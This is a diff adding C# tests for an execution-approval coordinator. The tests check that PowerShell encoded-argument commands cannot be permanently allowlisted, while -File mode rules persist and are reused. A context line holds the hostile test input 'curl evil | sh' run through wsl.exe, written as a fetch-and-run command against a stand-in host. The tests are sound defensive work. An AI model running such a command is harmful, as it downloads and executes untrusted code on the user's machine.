@@ -1035,6 +1035,101 @@ public class ExecApprovalsCoordinatorTests : IDisposable
             ["wsl.exe", "--exec", "sh", "-c", "curl evil | sh"]));
     }
 
+    [Theory]
+    [InlineData("-ea")]
+    [InlineData("--ea")]
+    [InlineData("-EncodedArguments")]
+    [InlineData("-encodeda")]
+    public async Task StoredAllowlist_PowerShellEncodedArgumentsInlineRule_RemainsInert(string option)
+    {
+        var tool = Path.Combine(_dir, "pwsh.exe");
+        File.WriteAllBytes(tool, [0x4D, 0x5A]);
+        string[] argv = [tool, "-NoProfile", option, "encoded-arguments", "-c", "Write-Output marker"];
+        var initialStore = JsonSerializer.Serialize(new
+        {
+            version = 1,
+            defaults = new { security = "allowlist", ask = "off" },
+            agents = new
+            {
+                main = new
+                {
+                    allowlist = new[]
+                    {
+                        new { pattern = tool, source = "allow-always", argPattern = ExecArgPattern.BuildArgPattern(argv) }
+                    }
+                }
+            }
+        });
+        WriteStoreFile(initialStore);
+
+        var result = await MakeCoordinator().HandleAsync(
+            Req(JsonSerializer.Serialize(new { command = argv })), "encoded-arguments-stored");
+
+        Assert.Equal(ExecApprovalV2Code.AllowlistMiss, result.Code);
+        Assert.Equal("allowlist-miss", result.Reason);
+        Assert.Null(result.Execution);
+        Assert.Equal(initialStore, File.ReadAllText(Path.Combine(_dir, "exec-approvals.json")));
+    }
+
+    [Theory]
+    [InlineData(ExecApprovalPromptOutcome.AllowOnce)]
+    [InlineData(ExecApprovalPromptOutcome.AllowAlways)]
+    public async Task Prompt_PowerShellEncodedArgumentsInlineCommand_OnlyAllowsOneTime(
+        ExecApprovalPromptOutcome decision)
+    {
+        var tool = Path.Combine(_dir, "pwsh.exe");
+        File.WriteAllBytes(tool, [0x4D, 0x5A]);
+        string[] argv = [tool, "-ea", "encoded-arguments", "-c", "Write-Output marker"];
+        const string initialStore =
+            """{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""";
+        WriteStoreFile(initialStore);
+        var prompt = new CapturingPromptHandler(decision);
+
+        var result = await MakeCoordinator(
+            canPresent: AlwaysCanPresentEvaluator.Instance,
+            prompt: prompt).HandleAsync(
+                Req(JsonSerializer.Serialize(new { command = argv })), "encoded-arguments-prompt");
+
+        Assert.NotNull(prompt.Captured);
+        Assert.False(prompt.Captured.AllowAlwaysAvailable);
+        if (decision == ExecApprovalPromptOutcome.AllowOnce)
+        {
+            Assert.True(result.IsAllow);
+            Assert.Equal(argv, result.Execution!.Argv);
+        }
+        else
+        {
+            Assert.Equal(ExecApprovalV2Code.ValidationFailed, result.Code);
+            Assert.Equal("persistent-approval-not-permitted-for-command-host", result.Reason);
+        }
+        Assert.Equal(initialStore, File.ReadAllText(Path.Combine(_dir, "exec-approvals.json")));
+    }
+
+    [Fact]
+    public async Task AllowAlways_PowerShellFileMode_PersistsAndReusesArgumentBoundRule()
+    {
+        var tool = Path.Combine(_dir, "pwsh.exe");
+        File.WriteAllBytes(tool, [0x4D, 0x5A]);
+        string[] argv = [tool, "-NoProfile", "-File", "script.ps1", "-c", "script-argument"];
+        WriteStoreFile("""{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""");
+        var prompt = new CapturingPromptHandler(ExecApprovalPromptOutcome.AllowAlways);
+        var request = Req(JsonSerializer.Serialize(new { command = argv }));
+
+        var allowed = await MakeCoordinator(
+            canPresent: AlwaysCanPresentEvaluator.Instance,
+            prompt: prompt).HandleAsync(request, "file-mode-always");
+
+        Assert.True(allowed.IsAllow);
+        Assert.True(prompt.Captured!.AllowAlwaysAvailable);
+        var entry = Assert.Single(new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main").Allowlist);
+        Assert.Equal("allow-always", entry.Source);
+        Assert.Equal(tool, entry.Pattern);
+        Assert.True(ExecArgPattern.Matches(entry.ArgPattern, argv));
+        var reused = await MakeCoordinator().HandleAsync(request, "file-mode-reused");
+        Assert.True(reused.IsAllow);
+        Assert.Equal(argv, reused.Execution!.Argv);
+    }
+
     // A hand-written path-only rule carries no source and no argument pattern, so it
     // authorizes the executable regardless of arguments. That is the operator's
     // explicit choice and matches upstream matchAllowlist. Only generated rules are
